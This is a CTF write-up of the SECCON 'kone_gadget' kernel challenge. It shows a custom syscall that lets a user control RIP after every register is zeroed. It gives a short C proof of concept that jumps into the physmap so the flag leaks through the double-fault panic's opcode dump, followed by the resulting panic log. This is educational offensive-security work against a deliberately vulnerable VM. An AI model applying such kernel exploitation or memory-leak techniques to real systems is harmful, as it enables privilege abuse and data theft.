# kone_gadget

**Authors** [Nspace](https://twitter.com/_MatteoRizzo)

**Tags**: pwn, kernel

**Points**: 365 (5 solves)

> Does any "one gadget" exist in kernel-land?
> `nc niwatori.quals.seccon.jp 11111`
> [kone_gadget.tar.gz](https://secconctf-prod.s3.isk01.sakurastorage.jp/production/kone_gadget/kone_gadget.tar.gz) deb1280bb874b1847f5891599784bf683bee65dc
>
> author:ptr-yudai

## TL; DR:

```nasm
jmp flag
```

The panic handler prints out the flag.

## Analysis

The setup is pretty simple. We get an unprivileged shell in a Linux VM and the flag is in a file inside the VM that only root can read. We have to exploit the kernel to gain root privileges to that we can read the flag. The challenge VM has every mitigation (SMEP, SMAP, KPTI) enabled except KASLR.

The challenge's kernel has a custom syscall, `SYS_seccon`:

```c
SYSCALL_DEFINE1(seccon, unsigned long, rip)
{
  asm volatile("xor %%edx, %%edx;"
               "xor %%ebx, %%ebx;"
               "xor %%ecx, %%ecx;"
               "xor %%edi, %%edi;"
               "xor %%esi, %%esi;"
               "xor %%r8d, %%r8d;"
               "xor %%r9d, %%r9d;"
               "xor %%r10d, %%r10d;"
               "xor %%r11d, %%r11d;"
               "xor %%r12d, %%r12d;"
               "xor %%r13d, %%r13d;"
               "xor %%r14d, %%r14d;"
               "xor %%r15d, %%r15d;"
               "xor %%ebp, %%ebp;"
               "xor %%esp, %%esp;"
               "jmp %0;"
               "ud2;"
               : : "rax"(rip));
  return 0;
}
```

The custom syscall zeroes every general-purpose register and then jumps to an address chosen by us. Somehow we have to use this to become root.

## Exploitation

This syscall would be trivial to exploit if we could simply jump to some shellcode in userspace and execute that. Unfortunately SMEP and KPTI would crash the kernel if we tried to do that, so it's not an option. We can only execute code in kernel pages. Under normal circumstances this is not a problem because we can use the RIP control to start a JOP chain or call a function in the kernel. Unfortunately `SYS_seccon` clears all the registers, including the stack pointer before jumping to our target. This makes the bug rather annoying to exploit:

* We cannot call any kernel functions because they all assume that they have a valid stack so they crash either in the function prologue or when they return. Moreover even if we still had a valid stack we wouldn't have any control over the arguments that these functions are called with.
* We cannot use the standard JOP approach of switching the stack to controlled memory and then starting a ROP chain because all the registers (except `rax`) are zero. We would somehow need to find some code in the kernel that contains a pointer to some controlled kernel memory, that contains a valid stack pivot, and that we can get to without crashing. Doesn't seem very likely.
* As soon as the CPU receives an interrupt the kernel will crash with a double fault because the interrupt handlers also assumes that there is a valid stack.

The challenge description hints at a "one gadget in kernel-land", a sequence of instruction that is present in the kernel and that will give us root when jumped to. While the idea might seem a bit far-fetched, there are [one-shot gadgets](https://github.com/david942j/one_gadget) in glibc that spawn a shell when jumped to so it doesn't seem entirely out of the realm of possibility[^1]. With that in mind I started searching, and didn't find anything. I did find some gadgets that would get back a valid stack by reading it from `gs:cpu_current_top_of_stack`, but none of them do anything useful. All the other gadgets would need a valid stack to be useful.

The other idea that I had was to modify some variable that is later used in the double fault handler. Normally a double fault panics and doesn't do anything else, but maybe there is a way to modify a variable so that the handler does what we want? Sadly there doesn't seem to be anything we can do here either.

At this point I was run out of things to try but staring at so many kernel panics gave me a new idea. Consider the following kernel panic message:

```
traps: PANIC: double fault, error_code: 0x0
double fault: 0000 [#1] SMP PTI
CPU: 0 PID: 129 Comm: pwn Not tainted 5.14.12 #4
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
RIP: 0010:commit_creds+0x0/0x190
Code: 48 89 e5 e8 92 fe ff ff 5d c3 8b 07 85 c0 7e 16 48 85 ff 74 05 3e ff 0f 74 01 c3 55 48 89 e5 e8 76 fe ff ff 5d c3 0f 0b 66 90 <55> 48 89 e5 41 55 65 4c 8b 2c 25 c0 6c 01 00 41 54 53 4d 8b a5 78
RSP: 0018:0000000000000000 EFLAGS: 00010246
RAX: ffffffff81073ad0 RBX: 0000000000000000 RCX: 0000000000000000
RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
FS:  00000000004040b8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: fffffffffffffff8 CR3: 0000000002ee2000 CR4: 00000000003006f0
```

The panic message is meant to help people debug the problem, so it includes quite a bit of information about the state of the kernel prior to the crash. For example it contains the values of the registers, a stack trace (not present here since we don't have a valid stack), and a printout of the machine code where the kernel crashed. On x86 the machine code is printed by [`show_opcodes`](https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/dumpstack.c#L119), which prints the 42 bytes preceding the address where the kernel crashed. However there is no check that these bytes are actually code: in principle they could be anything, even data.

So... could we use this to read the flag?

The answer is yes, at least for this challenge. The flag is located in memory, in the initramfs. The initramfs is just an uncompressed CPIO file so the flag is just there in plaintext, somewhere. Since there is no KASLR, the virtual address at which the initramfs is mapped is also constant between runs[^2]. The easiest way to locate the flag in memory is to dump the entire memory of the VM from the QEMU monitor and search for the flag in there. We can find the flag at physical address `0x228B000`, which is mapped at `0xffff88800228B000` in the physmap.

All that we have to do is to jump there, and we get the flag from the panic message.

```c
#include <sys/syscall.h>
#include <unistd.h>

int main(void)
{
    syscall(1337, 0xffff88800228B000 + 42);
}
```

```
traps: PANIC: double fault, error_code: 0x0
double fault: 0000 [#1] SMP PTI
CPU: 0 PID: 187 Comm: pwn Not tainted 5.14.12 #4
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
RIP: 0010:0xffff88800228b02a
Code: 53 45 43 43 4f 4e 7b 50 6c 65 61 73 65 20 44 4d 20 70 74 72 2d 79 75 64 61 69 20 69 66 20 55 20 73 6f 6c 76 65 64 20 74 68 69 <73> 20 77 69 74 68 6f 75 74 20 73 65 63 63 6f 6d 70 20 6f 72 20 62
RSP: 0018:0000000000000000 EFLAGS: 00000246
RAX: ffff88800228b02a RBX: 0000000000000000 RCX: 0000000000000000
RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
FS:  00000000004040b8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: fffffffffffffff8 CR3: 0000000002e20000 CR4: 00000000003006f0
Call Trace:
```

`SECCON{Please DM ptr-yudai if U solved this without seccomp or bpf}`

As you have probably guessed (and as the flag hints at), this solution was completely unintended. The intended way was to use the in-kernel BPF jit to mount a jit spraying attack on the kernel. This sounds makes a lot of sense but we didn't think of it during the CTF. Oh well... Still thanks to the author, it was a fun challenge to work on.

[^1]: It's worth noting though that the one-shot gadgets in glibc would not work without a valid stack. Had we had a valid stack here, this challenge would have been much easier.
[^2]: Even with KASLR we could have probably brute forced the address, as KASLR has notoriously low entropy.